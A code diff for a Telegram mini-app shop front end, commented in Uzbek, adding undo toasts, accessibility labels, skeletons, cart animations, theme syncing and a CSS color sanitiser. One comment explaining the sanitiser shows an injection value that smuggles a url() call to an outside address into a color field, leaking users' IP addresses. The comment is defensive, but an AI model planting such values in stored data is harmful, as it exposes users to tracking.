@@ -154,12 +154,91 @@
     enterHome._t = setTimeout(() => home.classList.remove("entering"), 600);
   }
 
-  function toast(msg, ms) {
+  /* ====================================================================
+     TOAST — NAVBAT BILAN VA «QAYTARISH» TUGMASI
+
+     ILGARI NIMA XATO EDI
+     `toast()` bitta joyga yozardi: `clearTimeout` + ustidan yozish. Ya'ni
+     ketma-ket ikki xabar chiqsa BIRINCHISI KO'RINMASDI. Kodda aynan
+     ketma-ket toast yuboradigan joy bor (buyurtma xatosida bir necha
+     muammo bir vaqtda aytiladi) — ular yo'qolardi.
+
+     `toastProgress` degan keyframe stylesheet'da ALLAQACHON bor edi, ya'ni
+     navbat o'ylangan, lekin yozilmagan.
+
+     ENDI: xabarlar navbatga tushadi va ketma-ket ko'rsatiladi. Ixtiyoriy
+     «Qaytarish» tugmasi bilan — shu tufayli o'chirishdan oldin tasdiq
+     so'rash kerak emas (bir bosish kamayadi va noto'g'ri o'chirish ham
+     tuzatiladi).
+     ==================================================================== */
+
+  const _toastQueue = [];
+  let _toastBusy = false;
+
+  /** @param {string} msg
+   *  @param {number|{ms?:number, undo?:Function, undoLabel?:string}} [opts] */
+  function toast(msg, opts) {
+    const conf = typeof opts === "number" ? { ms: opts } : opts || {};
+    _toastQueue.push({
+      msg: String(msg == null ? "" : msg),
+      ms: conf.ms || 2800,
+      undo: typeof conf.undo === "function" ? conf.undo : null,
+      undoLabel: conf.undoLabel || "Qaytarish",
+    });
+    // Navbat cheksiz o'smasin (masalan tarmoq uzilib ko'p xato kelsa)
+    if (_toastQueue.length > 6) _toastQueue.splice(0, _toastQueue.length - 6);
+    if (!_toastBusy) _toastNext();
+  }
+
+  function _toastNext() {
     const node = $("toast");
-    node.textContent = msg;
+    if (!node) return;
+
+    const item = _toastQueue.shift();
+    if (!item) {
+      _toastBusy = false;
+      node.classList.add("hidden");
+      return;
+    }
+    _toastBusy = true;
+
+    node.innerHTML = "";
+    node.append(el("span", "toast-tx", esc(item.msg)));
+
+    let closed = false;
+    const close = () => {
+      if (closed) return;
+      closed = true;
+      clearTimeout(toast._t);
+      node.classList.add("hidden");
+      // Chiqish animatsiyasi tugagach keyingisini ko'rsatamiz
+      setTimeout(_toastNext, 180);
+    };
+
+    if (item.undo) {
+      const btn = el("button", "toast-undo", esc(item.undoLabel));
+      btn.onclick = () => {
+        haptic("ok");
+        try {
+          item.undo();
+        } catch (err) {
+          console.error("[toast] qaytarish xatosi:", err);
+        }
+        close();
+      };
+      node.append(btn);
+    }
+
+    // «Qaytarish» bor bo'lsa mijozga o'ylash uchun ko'proq vaqt beramiz
+    const life = item.undo ? Math.max(item.ms, 4500) : item.ms;
+    /* Progress chizig'i (`.toast::after`) AYNAN shuncha davom etadi.
+       Ilgari u CSS'da qattiq 2.8 s edi va uzoqroq turgan xabarda vaqtni
+       yolg'on ko'rsatardi (chiziq tugagan, xabar hali turgan). */
+    node.style.setProperty("--toast-ms", life + "ms");
+
     node.classList.remove("hidden");
     clearTimeout(toast._t);
-    toast._t = setTimeout(() => node.classList.add("hidden"), ms || 2800);
+    toast._t = setTimeout(close, life);
   }
 
   function ask(msg) {
@@ -209,8 +288,15 @@
 
   /** Rasm ochilmasa — sindirilgan belgi ko'rinmasin, shunchaki yashiriladi. */
   const FALLBACK = 'onerror="this.dataset.failed=1;this.style.display=&quot;none&quot;"';
-  const img = (src, cls) =>
-    src ? `<img ${cls ? `class="${cls}"` : ""} src="${esc(src)}" alt="" loading="lazy" ${FALLBACK}>` : "";
+  /* `alt` — ixtiyoriy uchinchi argument.
+     Ilgari BARCHA yasalgan rasmlarda `alt=""` edi, hatto tovar nomi
+     mavjud bo'lganda ham. Bo'sh `alt` skrinreaderga «bu rasmni
+     e'tiborsiz qoldir» degani — bezak uchun to'g'ri, TOVAR uchun esa
+     mijoz nimani ko'rayotganini bilmaydi. */
+  const img = (src, cls, alt) =>
+    src
+      ? `<img ${cls ? `class="${cls}"` : ""} src="${esc(src)}" alt="${esc(alt || "")}" loading="lazy" ${FALLBACK}>`
+      : "";
 
   /** Ro'yxat bo'sh bo'lsa — chiroyli xabar (admin hali qo'shmagan bo'lishi mumkin). */
   function emptyState(box, text) {
@@ -1644,6 +1730,29 @@
     return Date.now() - (S.homeAt || 0) > HOME_TTL;
   }
 
+  /** Bosh sahifa yuklanayotganda joy egallab turadigan skeletonlar.
+   *
+   *  Ilgari skeleton FAQAT tovarlar uchun bor edi (ikkita qattiq
+   *  `<div class="skel">`), stories halqalari va bannerlar esa BIRDAN
+   *  paydo bo'lardi — sahifa sakrardi va mijoz bosayotgan tugma
+   *  siljib ketardi. */
+  function showHomeSkeletons() {
+    const products = $("products");
+    if (products && !products.children.length) {
+      products.innerHTML =
+        '<div class="skel"></div><div class="skel"></div>' +
+        '<div class="skel"></div><div class="skel"></div>';
+    }
+    const stories = $("stories");
+    if (stories && !stories.children.length) {
+      stories.innerHTML = new Array(5).fill('<div class="skel-ring"></div>').join("");
+    }
+    const banners = $("banners");
+    if (banners && !banners.children.length) {
+      banners.innerHTML = '<div class="skel-banner"></div>';
+    }
+  }
+
   async function loadHome(opts) {
     const force = !!(opts && opts.force);
 
@@ -1662,9 +1771,7 @@
 
   async function _loadHome(force) {
     if (force) S.home = null;
-    if (!$("products").children.length) {
-      $("products").innerHTML = '<div class="skel"></div><div class="skel"></div>';
-    }
+    showHomeSkeletons();
     try {
       /* ================================================================
          DO'KON MANBASI — FIREBASE BIRINCHI (Avto_A1 modeli)
@@ -1910,9 +2017,10 @@
       const cover = abs((items[0] && items[0].photo_url) || null);
       node.innerHTML = `
         <div class="story-ring">
-          <div class="story-face" style="background:linear-gradient(150deg,${esc(
-            ring.color_from
-          )},${esc(ring.color_to)})">${cover ? img(cover) : esc(ring.emoji)}</div>
+          <div class="story-face" style="background:${gradientOf(
+            ring.color_from,
+            ring.color_to
+          )}">${cover ? img(cover) : esc(ring.emoji)}</div>
           ${items.length > 1 ? `<i class="story-count">${items.length}</i>` : ""}
         </div>
         <span class="story-label">${esc(ring.title)}</span>`;
@@ -2133,9 +2241,10 @@
          turmasin (ilgari shunday edi). */
       const bg = photo ? `<img id="story-photo" class="loading" src="${esc(photo)}" alt="">` : "";
       inner.innerHTML = `
-        <div class="story-bg" style="background:linear-gradient(160deg,${esc(
-          story.color_from
-        )},${esc(story.color_to)} 75%, #000)">${bg}</div>
+        <div class="story-bg" style="background:linear-gradient(160deg,${safeColor(
+          story.color_from,
+          "#2a2d38"
+        )},${safeColor(story.color_to, "#12131a")} 75%, #000)">${bg}</div>
         ${photo ? '<div class="story-spinner" id="story-spinner"></div>' : ""}
         <div class="story-shade"></div>
         ${!bg ? `<div class="story-emoji">${esc(story.emoji)}</div>` : ""}
@@ -2183,9 +2292,10 @@
     const ava = $("story-ava");
     if (ava) {
       ava.textContent = ring.emoji || "📸";
-      ava.style.background = `linear-gradient(150deg,${ring.color_from || "#ff4b3e"},${
-        ring.color_to || "#1a0508"
-      })`;
+      ava.style.background = `linear-gradient(150deg,${safeColor(
+        ring.color_from,
+        "#ff4b3e"
+      )},${safeColor(ring.color_to, "#1a0508")})`;
     }
     const nameEl = $("story-who-name");
     if (nameEl) {
@@ -2588,7 +2698,7 @@
 
     list.forEach((b, i) => {
       const node = el("div", "banner");
-      node.style.background = `linear-gradient(135deg,${b.color_from},${b.color_to})`;
+      node.style.background = gradientOf(b.color_from, b.color_to);
       const photo = abs(b.photo_url);
       node.innerHTML = `
         ${img(photo, "banner-bg")}
@@ -2732,7 +2842,7 @@
       add.disabled = p.stock < 1;
       add.title = "Savatchaga";
       add.onclick = () => {
-        addToCart(p);
+        addToCart(p, 1, add);
         add.textContent = "✓";
         setTimeout(() => (add.textContent = "➕"), 1100);
       };
@@ -3048,9 +3158,14 @@
     // Tanlangan turkum yo'qolgan bo'lsa (tovar o'chirilgan) — hammasiga qaytamiz
     if (S.shopCat && !count.has(S.shopCat)) S.shopCat = null;
 
+    /* `aria-pressed` — chip BOSILGAN holatini bildiradi. Ilgari tanlangan
+       chip faqat `.on` klassi bilan ajratilardi, ya'ni skrinreader qaysi
+       turkum tanlanganini AYTMASDI. */
     const chip = (key, label, n, on) =>
       '<button class="chip' +
       (on ? " on" : "") +
+      '" aria-pressed="' +
+      (on ? "true" : "false") +
       '" data-cat="' +
       esc(key) +
       '">' +
@@ -3092,7 +3207,7 @@
       (out ? " is-out" : "") +
       '">' +
       (photo
-        ? '<img class="prod-img" src="' + esc(photo) + '" alt="" loading="lazy">'
+        ? '<img class="prod-img" src="' + esc(photo) + '" alt="' + esc(p.name || "Tovar") + '" loading="lazy">'
         : '<span class="prod-art-ph">💡</span>') +
       (off ? '<span class="prod-off">−' + off + "%</span>" : "") +
       (p.badge ? '<span class="prod-badge">' + esc(p.badge) + "</span>" : "") +
@@ -3166,7 +3281,7 @@
     btn.onclick = (ev) => {
       ev.stopPropagation();
       if (out) return;
-      addToCart(p);
+      addToCart(p, 1, btn);
       btn.classList.add("added");
       btn.innerHTML = '<span class="prod-add-ico">✓</span><span class="prod-add-tx">Qo\'shildi</span>';
       setTimeout(() => {
@@ -3242,7 +3357,7 @@
               photo ? `poster="${esc(photo)}"` : ""
             } style="width:100%;border-radius:14px"></video>`
           : photo
-          ? `<img src="${esc(photo)}" alt="" style="width:100%;border-radius:14px">`
+          ? `<img src="${esc(photo)}" alt="${esc(p.name || "Tovar")}" style="width:100%;border-radius:14px">`
           : ""
       }
       <p class="step-sub" style="margin-top:12px">${esc(p.description || "")}</p>
@@ -3253,7 +3368,7 @@
     add.style.marginTop = "12px";
     add.disabled = p.stock < 1;
     add.onclick = () => {
-      addToCart(p);
+      addToCart(p, 1, add);
       closeSheet();
     };
 
@@ -3277,6 +3392,33 @@
       Ilgari bu funksiya faqat bitta argument olardi, modal esa
       `addToCart(product, modalQuantity)` deb chaqirardi — ikkinchi argument
       JIMGINA tashlab ketilardi va nechta tanlansa ham 1 dona qo'shilardi. */
+  /* ====================================================================
+     RANGLARNI TOZALASH (CSS injection himoyasi)
+
+     Banner va story halqalarining rangi bazadan keladi va ilgari
+     `style.background` ga TO'G'RIDAN qo'yilardi:
+
+         node.style.background = `linear-gradient(135deg,${b.color_from},...)`
+
+     Bazaga yozish esa brauzerdan ochiq (admin paneli shunday ishlaydi),
+     ya'ni qiymat ishonchsiz. `color_from` ga masalan
+     `red), url(https://tashqi-manzil/?x=` yozib qo'yilsa brauzer o'sha
+     manzilga so'rov yuborardi — mijozning IP manzili sizib ketardi.
+
+     Endi qiymat faqat hex rang yoki rang NOMI bo'lishi mumkin. Firebase
+     qoidalarida ham xuddi shu tekshiruv bor (ikki qatlamli himoya).
+     ==================================================================== */
+  const SAFE_COLOR = /^(#[0-9a-fA-F]{3,8}|[a-zA-Z]{3,20})$/;
+
+  function safeColor(value, fallback) {
+    const text = String(value == null ? "" : value).trim();
+    return SAFE_COLOR.test(text) ? text : fallback || "#1d2029";
+  }
+
+  function gradientOf(from, to) {
+    return `linear-gradient(135deg,${safeColor(from, "#2a2d38")},${safeColor(to, "#12131a")})`;
+  }
+
   /** Tovar qoldig'i — HAR DOIM son. Noma'lum yoki buzuq bo'lsa 0.
    *
    *  ================================================================
@@ -3296,7 +3438,67 @@
     return Number.isFinite(raw) ? Math.max(0, raw) : 0;
   }
 
-  function addToCart(product, qty) {
+  /* ====================================================================
+     «SAVATGA UCHISH» ANIMATSIYASI
+
+     Savatga qo'shish — ilovadagi ENG KO'P BOSILADIGAN tugma, lekin ilgari
+     javob faqat haptic va nishondagi raqam edi: mijoz tovar qayerga
+     ketganini KO'RMASDI.
+
+     Bu naqsh loyihada allaqachon bor (`flyHeart` — story reaksiyasi),
+     shu yerga qo'llanmagan edi.
+
+     Animatsiya `position: fixed` element bilan qilinadi (DOM tartibiga
+     ta'sir qilmaydi) va `requestAnimationFrame` ichida boshlanadi.
+     Tugagach element O'ZINI O'CHIRADI — aks holda har bosishda sahifada
+     bittadan «o'lik» element qolib borardi.
+     ==================================================================== */
+  function flyToCart(sourceEl, emoji) {
+    // Harakatni kamaytirish rejimi — animatsiya qilmaymiz
+    try {
+      if (window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches) {
+        return;
+      }
+    } catch (_) {}
+
+    const target = $("cart-badge") || document.querySelector('.nav-btn[data-page="cart"]');
+    if (!sourceEl || !target || !sourceEl.getBoundingClientRect) return;
+
+    const from = sourceEl.getBoundingClientRect();
+    const to = target.getBoundingClientRect();
+    if (!from.width || !to.width) return;
+
+    const dot = el("div", "fly-cart", emoji || "🛒");
+    dot.style.left = from.left + from.width / 2 + "px";
+    dot.style.top = from.top + from.height / 2 + "px";
+    document.body.appendChild(dot);
+
+    const dx = to.left + to.width / 2 - (from.left + from.width / 2);
+    const dy = to.top + to.height / 2 - (from.top + from.height / 2);
+
+    requestAnimationFrame(() => {
+      dot.style.transform = `translate(${dx}px, ${dy}px) scale(0.35)`;
+      dot.style.opacity = "0.15";
+    });
+
+    // `transitionend` kelmasa ham element qolib ketmasin
+    let done = false;
+    const cleanup = () => {
+      if (done) return;
+      done = true;
+      dot.remove();
+      // Nishonni «sakratamiz» — tovar yetib kelgani ko'rinadi
+      if (target.classList) {
+        target.classList.remove("landed");
+        void target.offsetWidth;
+        target.classList.add("landed");
+      }
+    };
+    dot.addEventListener("transitionend", cleanup, { once: true });
+    setTimeout(cleanup, 700);
+  }
+
+  function addToCart(product, qty, sourceEl) {
     const want = Math.max(1, parseInt(qty, 10) || 1);
     const found = S.cart.find((i) => i.id === product.id);
     const have = found ? found.qty : 0;
@@ -3323,6 +3525,7 @@
       });
     saveCart();
     haptic();
+    if (sourceEl) flyToCart(sourceEl, "🛒");
   }
 
   /* DIQQAT: `renderBookCard()` OLIB TASHLANDI.
@@ -3419,11 +3622,21 @@
     const clear = el("button", "cart-clear", "🗑 Savatni bo'shatish");
     clear.onclick = async () => {
       if (!(await ask("Savatdagi hamma narsa o'chirilsinmi?"))) return;
+      // Nusxasini saqlaymiz — «Qaytarish» uchun
+      const backup = S.cart.slice();
       S.cart = [];
       saveCart();
       renderCart();
       haptic("success");
-      toast("Savat bo'shatildi");
+      toast("Savat bo'shatildi", {
+        undo: () => {
+          // Shu orada yangi tovar qo'shilgan bo'lsa uni YO'QOTMAYMIZ
+          const current = S.cart.slice();
+          S.cart = backup.concat(current.filter((i) => !backup.some((b) => b.id === i.id)));
+          saveCart();
+          renderCart();
+        },
+      });
     };
     box.append(clear);
 
@@ -3445,10 +3658,25 @@
 
   /** Savat qatorini butunlay o'chiradi (swipe → 🗑). */
   function removeCartItem(id) {
+    const index = S.cart.findIndex((i) => i.id === id);
+    if (index < 0) return;
+    const removed = S.cart[index];
+
     S.cart = S.cart.filter((i) => i.id !== id);
     haptic("light");
     saveCart();
     renderCart();
+
+    /* «Qaytarish» — noto'g'ri surib o'chirish oson bo'lgani uchun.
+       Tovar AYNAN o'z joyiga qaytariladi (oxiriga emas). */
+    toast(`${removed.name || "Tovar"} o'chirildi`, {
+      undo: () => {
+        if (S.cart.some((i) => i.id === removed.id)) return; // qayta qo'shilgan
+        S.cart.splice(Math.min(index, S.cart.length), 0, removed);
+        saveCart();
+        renderCart();
+      },
+    });
   }
 
   /** Bepul yetkazib berishgacha progress bar (rang red→orange→green). */
@@ -5482,14 +5710,21 @@
                    ? '<span class="ad-act is-on">⭐ Asosiy</span>'
                    : `<button class="ad-act" data-adact="def" data-adi="${i}">⭐ Asosiy qilish</button>`
                }
-               <button class="ad-act" data-adact="edit" data-adi="${i}">✏️</button>
+               <!-- Bu tugmalarda FAQAT emoji bor, ya'ni skrinreader ularni
+                    "tugma" deb o'qib, nima qilishini AYTMASDI. Shu sababli
+                    aria-label va title qo'shildi. -->
+               <button class="ad-act" data-adact="edit" data-adi="${i}"
+                 aria-label="Manzilni tahrirlash" title="Tahrirlash">✏️</button>
                ${
                  a.mapLink
-                   ? `<button class="ad-act" data-adact="map" data-adi="${i}">🗺</button>`
+                   ? `<button class="ad-act" data-adact="map" data-adi="${i}"
+                        aria-label="Xaritada ko'rish" title="Xaritada ko'rish">🗺</button>`
                    : ""
                }
-               <button class="ad-act" data-adact="copy" data-adi="${i}">📋</button>
-               <button class="ad-act is-danger" data-adact="del" data-adi="${i}">🗑</button>
+               <button class="ad-act" data-adact="copy" data-adi="${i}"
+                 aria-label="Manzilni nusxalash" title="Nusxalash">📋</button>
+               <button class="ad-act is-danger" data-adact="del" data-adi="${i}"
+                 aria-label="Manzilni o'chirish" title="O'chirish">🗑</button>
              </div>
            </div>`
       )
@@ -5542,7 +5777,19 @@
       // boshqa manzilga buyurtma ketishi mumkin edi).
       S._dlvSelectedAddr = null;
       haptic("success");
-      toast("Manzil o'chirildi");
+      // «Qaytarish» — manzil qo'lda yozilgan, tasodifan o'chirilsa
+      // qaytadan kiritish (va xaritada belgilash) uzoq ish.
+      toast("Manzil o'chirildi", {
+        undo: () => {
+          const now = getAddresses();
+          now.splice(Math.min(i, now.length), 0, a);
+          if (wasDef) now.forEach((x, k) => (x.def = k === Math.min(i, now.length - 1)));
+          saveAddresses(now);
+          S._dlvSelectedAddr = null;
+          renderAddressPage();
+          renderAddrHint();
+        },
+      });
       renderAddressPage();
       renderAddrHint();
       return;
@@ -6481,14 +6728,63 @@
     } catch (_) {}
   }
 
+  /* ====================================================================
+     TELEGRAM MAVZUSI BILAN MOSLASHTIRISH
+
+     MUAMMO. Ilgari `themeParams` va `colorScheme` BUTUN ILOVADA bir marta
+     ham ishlatilmagan edi, ranglar esa uch joyda QATTIQ yozilgan:
+     `tg.setHeaderColor("#08080a")`, `tg.setBackgroundColor("#08080a")` va
+     `<meta name="theme-color">`. Natijada:
+
+       * palitra o'zgarsa bu uchtasi eskirib qolardi (bir-biriga bog'liq
+         emas);
+       * Telegram'ning pastki paneli (bottom bar) sozlanmasdi va qora
+         ilova ostida boshqa rangda ko'rinardi;
+       * mijoz Telegram'da kunduzgi rejimga o'tsa hech narsa o'zgarmasdi.
+
+     YECHIM. Rang stylesheet'dagi `--bg` dan O'QILADI (yagona manba) va
+     Telegram chetlariga uzatiladi. Ilovaning o'zi qora qoladi — bu brend
+     qarori (yuqoridagi `styles.css` izohiga qara).
+     ==================================================================== */
+  function applyTgTheme() {
+    if (!tg) return;
+
+    // Yagona manba: CSS o'zgaruvchisi
+    let bg = "";
+    try {
+      bg = getComputedStyle(document.documentElement)
+        .getPropertyValue("--bg")
+        .trim();
+    } catch (_) {}
+    if (!/^#[0-9a-fA-F]{3,8}$/.test(bg)) bg = "#08080a"; // zaxira
+
+    try {
+      if (tg.setHeaderColor) tg.setHeaderColor(bg);
+    } catch (_) {}
+    try {
+      if (tg.setBackgroundColor) tg.setBackgroundColor(bg);
+    } catch (_) {}
+    try {
+      // Telegram 7.10+ — pastki panel. Ilgari umuman sozlanmasdi.
+      if (tg.setBottomBarColor) tg.setBottomBarColor(bg);
+    } catch (_) {}
+
+    // Brauzer chizadigan joylar ham mos bo'lsin (masalan Android'da
+    // klaviatura ochilganda ko'rinadigan tor chiziq)
+    const meta = document.querySelector('meta[name="theme-color"]');
+    if (meta) meta.setAttribute("content", bg);
+  }
+
   async function boot() {
     let carsReady = Promise.resolve(); // mashinalar so'rovi (parallel yuklanadi)
     if (tg) {
       tg.ready();
       tg.expand();
+      applyTgTheme();
       try {
-        tg.setHeaderColor("#08080a");
-        tg.setBackgroundColor("#08080a");
+        // Telegram mavzusi o'zgarsa (mijoz kunduzgi/tungi rejimni almashtirsa)
+        // chetlardagi ranglarni QAYTA tenglashtiramiz.
+        if (tg.onEvent) tg.onEvent("themeChanged", applyTgTheme);
       } catch (_) {}
       if (tg.BackButton) tg.BackButton.onClick(goBack);
       if (tg.enableClosingConfirmation) tg.enableClosingConfirmation();
@@ -8068,25 +8364,39 @@
     });
   }
 
-  function closeProductModal() {
+  /** Tovar oynasini yopadi.
+   *  @param {boolean} skipAnim — surib yopilganda `true`: harakat
+   *     ALLAQACHON qilingan, ustiga `modalSlideDown` qo'yilsa oyna
+   *     sakrab ketadi. */
+  function closeProductModal(skipAnim) {
     const modal = $("productModal");
+    if (!modal) return;
 
     // Rasm ko'ruvchi ochiq bo'lsa u ham yopiladi (ostida qolib ketmasin)
     if (viewerOpen()) closeViewer();
 
-    // Animatsiya bilan yopish
-    modal.style.animation = "modalSlideDown 0.25s cubic-bezier(0.4, 0, 1, 1)";
-    
-    setTimeout(() => {
+    const finish = () => {
       modal.classList.add("hidden");
       modal.style.animation = "";
+      // Surish qoldirgan uslublarni HAM tozalaymiz — aks holda keyingi
+      // ochilishda oyna yarim surilgan holatda paydo bo'lardi.
+      modal.style.transform = "";
+      modal.style.opacity = "";
+      modal.style.transition = "";
       document.body.style.overflow = "";
-    }, 250);
-    
+    };
+
+    if (skipAnim) {
+      finish();
+    } else {
+      modal.style.animation = "modalSlideDown 0.25s cubic-bezier(0.4, 0, 1, 1)";
+      setTimeout(finish, 250);
+    }
+
     currentProduct = null;
     const slider = $("pm-slider");
-    slider.removeEventListener("scroll", handleModalScroll);
-    
+    if (slider) slider.removeEventListener("scroll", handleModalScroll);
+
     haptic("light");
   }
 
@@ -8106,7 +8416,7 @@
   function addFromModal() {
     if (!currentProduct || currentProduct.stock < 1) return;
     
-    addToCart(currentProduct, modalQuantity);
+    addToCart(currentProduct, modalQuantity, $("pm-add-cart"));
     
     // Success animatsiya
     const btn = $("pm-add-cart");
@@ -8265,7 +8575,11 @@
 
   // Event listenerlar
   function initProductModal() {
-    $("pm-close").onclick = closeProductModal;
+    /* DIQQAT: o'ram funksiya SHART. `onclick = closeProductModal` deb
+       yozilsa brauzer birinchi argument sifatida Event obyektini uzatadi
+       va u `skipAnim` bo'lib qoladi (Event doim truthy) — natijada yopilish
+       animatsiyasi ishlamay, oyna birdan g'oyib bo'lardi. */
+    $("pm-close").onclick = () => closeProductModal();
     $("pm-wishlist").onclick = toggleModalWishlist;
     $("pm-qty-minus").onclick = () => updateModalQuantity(-1);
     $("pm-qty-plus").onclick = () => updateModalQuantity(1);
@@ -8291,6 +8605,91 @@
       if (viewerOpen()) return closeViewer();
       if (currentProduct) closeProductModal();
     });
+
+    bindModalDrag();
+  }
+
+  /* ====================================================================
+     TOVAR OYNASINI PASTGA SURIB YOPISH
+
+     Ilovada uchta to'liq ekranli qatlam bor: rasm ko'ruvchi, story va
+     tovar oynasi. Birinchi ikkitasini SURIB yopish mumkin edi, tovar
+     oynasini — YO'Q (faqat «✕»). Bir ilovada ikki xil xatti-harakat:
+     mijoz qo'li o'rgangan harakatni qiladi, hech narsa bo'lmaydi.
+
+     Tovar oynasi eng ko'p ochiladigan qatlam, shuning uchun bir xillik
+     aynan shu yerda muhim.
+
+     DIQQAT: sur faqat oyna TEPASIDAN boshlansa ishlaydi. Aks holda
+     tovar tavsifini varaqlash (vertikal scroll) yopish deb tushunilardi.
+     ==================================================================== */
+  function bindModalDrag() {
+    const modal = $("productModal");
+    if (!modal || modal.dataset.dragBound === "1") return;
+    modal.dataset.dragBound = "1";
+
+    let startY = 0;
+    let dy = 0;
+    let dragging = false;
+
+    const CLOSE_AT = 110; // shu masofadan keyin qo'yib yuborilsa yopiladi
+
+    modal.addEventListener(
+      "touchstart",
+      (e) => {
+        // Rasm ko'ruvchi ochiq bo'lsa u o'z harakatini boshqaradi
+        if (viewerOpen()) return;
+        if (!e.touches || e.touches.length !== 1) return;
+        // Faqat tepadan: pastda kontent varaqlanadi
+        if (modal.scrollTop > 4) return;
+        startY = e.touches[0].clientY;
+        dy = 0;
+        dragging = true;
+        modal.style.transition = "none";
+      },
+      { passive: true }
+    );
+
+    modal.addEventListener(
+      "touchmove",
+      (e) => {
+        if (!dragging || !e.touches || !e.touches.length) return;
+        dy = e.touches[0].clientY - startY;
+        if (dy <= 0) return; // faqat pastga
+        // Rezina effekti: masofa oshgani sari sekinlashadi
+        const shift = Math.pow(dy, 0.85);
+        modal.style.transform = `translateY(${shift}px)`;
+        modal.style.opacity = String(Math.max(0.4, 1 - dy / 600));
+      },
+      { passive: true }
+    );
+
+    const release = () => {
+      if (!dragging) return;
+      dragging = false;
+      modal.style.transition = "transform 0.22s var(--silk), opacity 0.22s var(--silk)";
+
+      if (dy > CLOSE_AT) {
+        haptic("light");
+        // Yopilgandan keyin uslublarni tozalaymiz — aks holda keyingi
+        // ochilishda oyna surilgan holatda paydo bo'lardi.
+        modal.style.transform = "translateY(100%)";
+        modal.style.opacity = "0";
+        // `skipAnim = true` — harakat allaqachon qilindi
+        setTimeout(() => closeProductModal(true), 200);
+        return;
+      }
+
+      // Yetarli surilmadi — joyiga qaytadi
+      modal.style.transform = "";
+      modal.style.opacity = "";
+      setTimeout(() => {
+        modal.style.transition = "";
+      }, 240);
+    };
+
+    modal.addEventListener("touchend", release, { passive: true });
+    modal.addEventListener("touchcancel", release, { passive: true });
   }
 
   // Yordamchi funksiya: saqlanganlarni localStorage ga yozish
